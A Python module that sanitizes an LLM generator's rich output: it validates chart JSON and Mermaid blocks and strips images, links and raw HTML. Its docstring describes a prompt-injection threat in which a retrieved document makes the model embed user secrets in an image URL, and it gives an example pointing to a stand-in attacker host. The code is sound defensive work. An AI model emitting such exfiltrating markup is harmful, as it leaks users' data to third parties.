"""Validates the rich blocks the generator may emit (after L8 has screened the full text).

- ```chart blocks: parsed as JSON and rebuilt from a strict whitelist (type, title, labels,
  datasets[label, data]). Nothing else survives — no chart.js options, callbacks or
  plugins — so model output can't smuggle behaviour into the browser. Invalid charts are
  replaced by a short note.
- ```mermaid blocks: size-limited; `%%{init}` directives and `click` handlers are removed
  (the UI also renders Mermaid with securityLevel "strict").
- Markdown tables are counted (the UI renders and sanitizes them).
- Small local models often drop the language tag (```\nflowchart TD) or put it on the next
  line (```\nmermaid\n...). Such blocks are labelled first, so they're validated like the rest.
- Render guard (DECISIONS.md D-22, threat row 8): a retrieved document can tell the model to
  put the user's data in a URL (`![x](https://attacker.example/p.png?d=SECRET)`), which the
  browser would fetch on render or the user would follow on click. So, outside the validated
  chart/mermaid blocks:
    * Markdown images (inline and reference-style) and raw HTML images are removed;
    * links (inline, reference-style, <autolinks>, raw <a href> and bare URLs) become plain
      text with the URL in a code span, so it stays readable but isn't clickable;
    * reference definitions (`[r]: https://...`) are removed;
    * any other raw HTML tag is removed unless it's a plain formatting tag with no attributes.
  This is deterministic: it doesn't look at where a URL points or what it carries. Links to
  hosts in `render_link_allowlist` (empty by default) are left clickable; images never are.
"""
import json
import math
import re

CHART_TYPES = {"bar", "line", "pie", "doughnut"}
MAX_LABELS, MAX_DATASETS, MAX_LABEL_CHARS, MAX_MERMAID_CHARS = 50, 6, 80, 4000

_FENCE = re.compile(r"```[ \t]*(chart|mermaid)[ \t]*\n(.*?)```", re.DOTALL | re.IGNORECASE)
_TABLE_SEP = re.compile(r"^\s*\|?\s*:?-{3,}:?\s*(\|\s*:?-{3,}:?\s*)+\|?\s*$", re.MULTILINE)
_MERMAID_BAD = re.compile(r"^\s*(%%\{.*?\}%%|click\s.*)$", re.MULTILINE | re.IGNORECASE)
_FENCE_OPEN = re.compile(r"^(\s*)```[ \t]*([\w-]*)[ \t]*$")
_FENCE_CLOSE = re.compile(r"^\s*```\s*$")
_MERMAID_START = re.compile(r"^(flowchart|graph|sequenceDiagram|classDiagram|stateDiagram(-v2)?|erDiagram|"
                            r"gantt|journey|mindmap|timeline)\b")


def _guess_language(block: list[str]) -> tuple[str, list[str]]:
    """('mermaid' | 'chart' | '', block without a language line) for an untagged fence."""
    body = [l for l in block if l.strip()]
    if not body:
        return "", block
    first = body[0].strip()
    if first.lower() in ("mermaid", "chart"):
        return first.lower(), block[block.index(body[0]) + 1:]
    if _MERMAID_START.match(first):
        return "mermaid", block
    joined = "\n".join(body)
    if first.startswith("{") and '"datasets"' in joined:
        return "chart", block
    return "", block


def label_untagged_fences(text: str) -> str:
    lines, out, i = text.split("\n"), [], 0
    while i < len(lines):
        m = _FENCE_OPEN.match(lines[i])
        if not m:
            out.append(lines[i])
            i += 1
            continue
        j = i + 1
        while j < len(lines) and not _FENCE_CLOSE.match(lines[j]):
            j += 1
        block, opening = lines[i + 1:j], lines[i]
        if not m.group(2):
            lang, block = _guess_language(block)
            if lang:
                opening = f"{m.group(1)}```{lang}"
        out.append(opening)
        out.extend(block)
        if j < len(lines):
            out.append(lines[j])
        i = j + 1
    return "\n".join(out)


def _num(v):
    if isinstance(v, bool):
        raise ValueError("bool is not a number")
    if isinstance(v, str):
        v = float(v.replace(",", "").replace("$", "").replace("%", "").strip())
    v = float(v)
    if not math.isfinite(v):
        raise ValueError("non-finite")
    return int(v) if v.is_integer() else round(v, 6)


def _text(v, limit=MAX_LABEL_CHARS) -> str:
    return re.sub(r"[<>`]", "", str(v)).strip()[:limit]


def validate_chart(raw: str) -> dict:
    spec = json.loads(raw)
    if not isinstance(spec, dict):
        raise ValueError("chart must be a JSON object")
    ctype = str(spec.get("type", "bar")).lower()
    if ctype not in CHART_TYPES:
        raise ValueError(f"unsupported chart type {ctype!r}")
    labels = spec.get("labels")
    datasets = spec.get("datasets")
    if not isinstance(labels, list) or not 0 < len(labels) <= MAX_LABELS:
        raise ValueError("labels must be a non-empty list")
    if not isinstance(datasets, list) or not 0 < len(datasets) <= MAX_DATASETS:
        raise ValueError("datasets must be a non-empty list")
    clean_sets = []
    for ds in datasets:
        data = ds.get("data") if isinstance(ds, dict) else None
        if not isinstance(data, list) or len(data) != len(labels):
            raise ValueError("each dataset needs one number per label")
        clean_sets.append({"label": _text(ds.get("label", "")), "data": [_num(v) for v in data]})
    if ctype in ("pie", "doughnut"):
        clean_sets = clean_sets[:1]
    return {"type": ctype, "title": _text(spec.get("title", ""), 120),
            "labels": [_text(l) for l in labels], "datasets": clean_sets}


def clean_mermaid(src: str) -> str:
    src = _MERMAID_BAD.sub("", src)
    # No raw HTML in labels (an <img> or <a> there would load or link out); <br> is kept.
    src = re.sub(r"<(?!br\s*/?>)[A-Za-z!/?][^>]*>?", "", src, flags=re.IGNORECASE).strip()
    if not src or len(src) > MAX_MERMAID_CHARS:
        raise ValueError("empty or oversized diagram")
    return src


# --- render guard
# Link text may hold one level of nested brackets; destinations may be <bracketed> or hold
# balanced parentheses (CommonMark). Titles are optional.
_LABEL = r"((?:[^\[\]\\]|\\.|\[(?:[^\[\]\\]|\\.)*\])*)"
_DEST = r"\s*(<[^<>\n]*>|(?:[^\s()\\]|\\.|\([^\s()]*\))*)"
_TITLE = r"""(?:\s+(?:"[^"]*"|'[^']*'|\([^()]*\)))?\s*"""
_INLINE_IMAGE = re.compile(r"!\[" + _LABEL + r"\]\(" + _DEST + _TITLE + r"\)")
_INLINE_LINK = re.compile(r"\[" + _LABEL + r"\]\(" + _DEST + _TITLE + r"\)")
_REF_DEF = re.compile(r"^[ \t]*(?:>[ \t]*)*(?:(?:[-*+]|\d+[.)])[ \t]+)?\[((?:[^\[\]\\]|\\.)+)\]:"
                      r"[ \t]*\n?[ \t]*(<[^<>\n]*>|\S+).*$", re.MULTILINE)
_REF_IMAGE = re.compile(r"!\[" + _LABEL + r"\](?:\[([^\[\]]*)\])?")
_REF_LINK = re.compile(r"\[" + _LABEL + r"\](?:\[([^\[\]]*)\])?")
_AUTOLINK = re.compile(r"<([A-Za-z][A-Za-z0-9+.-]{1,31}:[^\s<>]*|[^\s<>@]+@[^\s<>]+)>")
_BARE_URL = re.compile(r"(?:(?:https?|ftp)://|www\.)[^\s<>`]*[^\s<>`.,:;\"')\]!?*_~]", re.IGNORECASE)
_HTML_DROP = re.compile(r"<(script|style|template|textarea|title|noscript)\b[^>]*>.*?</\1\s*>",
                        re.DOTALL | re.IGNORECASE)
_HTML_A = re.compile(r"""<a\b[^>]*?\bhref\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))[^>]*>(.*?)</a\s*>""",
                     re.DOTALL | re.IGNORECASE)
_HTML_IMG = re.compile(r"<(?:img|image|picture|source|video|audio|svg|iframe|object|embed|link|meta)\b[^>]*>?",
                       re.IGNORECASE)
_HTML_TAG = re.compile(r"<!--.*?-->|<![^<>]*>|<\?.*?\?>|</?[A-Za-z][A-Za-z0-9-]*(?:[\s/][^<>]*)?>", re.DOTALL)
_TAG_START = re.compile(r"(\\*)<(?=[A-Za-z!/?])")
_HTML_KEEP = re.compile(r"</?(?:br|b|strong|i|em|u|s|del|sup|sub|code|pre|p|ul|ol|li|hr|kbd|mark|small)\s*/?>",
                        re.IGNORECASE)
_SAFE_URL = re.compile(r"https://([A-Za-z0-9.-]+)(?::443)?(?:[/?#][^\s\\`<>\"]*)?")
_SLOT = re.compile(r"\x00(\d+)\x00")
IMAGE_REMOVED = "_(image removed)_"


def _ref_key(label: str) -> str:
    return " ".join(label.split()).casefold()


def _dest(raw: str) -> str:
    raw = raw.strip()
    return raw[1:-1] if raw.startswith("<") and raw.endswith(">") else raw


def neutralise_external_markup(text: str, allowed_link_hosts=()) -> tuple[str, dict]:
    """Returns (text with no renderable images and no clickable links outside the
    allowlist, counts). Rewritten pieces are parked in slots while later passes run, so a
    URL already turned into text isn't matched again."""
    allowed = {h.lower().strip() for h in allowed_link_hosts}
    counts = {"images_removed": 0, "links_neutralised": 0, "html_removed": 0}
    slots: list[str] = []

    def park(s: str) -> str:
        slots.append(s)
        return f"\x00{len(slots) - 1}\x00"

    def image(_m=None) -> str:
        counts["images_removed"] += 1
        return park(IMAGE_REMOVED)

    def link(label: str, url: str, keep: str) -> str:
        """`label (`url`)`, or `keep` unchanged when url is https:// on an allowlisted host."""
        m = _SAFE_URL.fullmatch(url)
        if m and m.group(1).lower() in allowed:
            return park(keep)
        counts["links_neutralised"] += 1
        url = url.replace("`", "%60").replace("\n", "")
        shown = park(f"`{url}`") if url else ""
        label = label.strip()
        return f"{label} ({shown})" if label and shown else (label or shown)

    text = text.replace("\x00", "")

    defs: dict[str, str] = {}

    def _def(m):
        defs.setdefault(_ref_key(m.group(1)), _dest(m.group(2)))
        return ""
    text = _REF_DEF.sub(_def, text)

    def _drop(m):
        counts["html_removed"] += 1
        return ""

    def _html_a(m):
        href = next(g for g in m.groups()[:3] if g is not None)
        return link(m.group(4), href, f"[{m.group(4)}]({href})")

    def _tag(m):
        return park(m.group(0)) if _HTML_KEEP.fullmatch(m.group(0)) else _drop(m)

    def _ref_link(m):
        key = _ref_key(m.group(2) or m.group(1))
        if key not in defs:
            return m.group(0)
        return link(m.group(1), defs[key], m.group(0))

    text = _HTML_DROP.sub(_drop, text)
    # Images first (Markdown and HTML), so none survives inside an allowlisted link's text.
    # Markdown runs before the HTML passes so a <bracketed> destination is still intact.
    text = _INLINE_IMAGE.sub(image, text)
    text = _HTML_IMG.sub(image, text)
    text = _REF_IMAGE.sub(lambda m: image() if m.group(2) is not None or _ref_key(m.group(1)) in defs
                          else m.group(0), text)
    text = _INLINE_LINK.sub(lambda m: link(m.group(1), _dest(m.group(2)), m.group(0)), text)
    text = _REF_LINK.sub(_ref_link, text)
    text = _HTML_A.sub(_html_a, text)
    text = _AUTOLINK.sub(lambda m: link("", m.group(1), m.group(0)), text)
    text = _HTML_TAG.sub(_tag, text)
    # A '<' that still looks like a tag start (unterminated: `<a href=x` ... a later '>')
    # is escaped so the browser can't complete it into a tag.
    text = _TAG_START.sub(lambda m: m.group(1) + ("<" if len(m.group(1)) % 2 else "\\<"), text)
    text = _BARE_URL.sub(lambda m: link("", m.group(0), m.group(0)), text)

    while _SLOT.search(text):
        text = _SLOT.sub(lambda m: slots[int(m.group(1))], text)
    return text, counts


def sanitize_rich_answer(text: str, allowed_link_hosts=(), render_guard: bool = True) -> tuple[str, dict]:
    """Returns (text with validated blocks and, with render_guard, no external images or
    clickable links; counts)."""
    text = label_untagged_fences(text)
    counts = {"charts": 0, "diagrams": 0, "tables": len(_TABLE_SEP.findall(text)), "dropped": 0}

    def _replace(m):
        kind, body = m.group(1).lower(), m.group(2)
        try:
            if kind == "chart":
                out = json.dumps(validate_chart(body), ensure_ascii=False)
                counts["charts"] += 1
            else:
                out = clean_mermaid(body)
                counts["diagrams"] += 1
            return f"```{kind}\n{out}\n```"
        except (ValueError, TypeError, json.JSONDecodeError):
            counts["dropped"] += 1
            return f"_({'chart' if kind == 'chart' else 'diagram'} omitted: the generated data was invalid)_"

    if not render_guard:
        return _FENCE.sub(_replace, text), counts
    # Validated blocks are set aside so the render guard sees only the rest of the answer
    # (other code fences included: a fence that marked doesn't treat as one would otherwise
    # be a way around it).
    blocks: list[str] = []

    def _set_aside(m):
        blocks.append(_replace(m))
        return f"\x01{len(blocks) - 1}\x01"

    text = _FENCE.sub(_set_aside, text.replace("\x01", ""))
    text, guard = neutralise_external_markup(text, allowed_link_hosts)
    counts.update(guard)
    return re.sub(r"\x01(\d+)\x01", lambda m: blocks[int(m.group(1))], text), counts
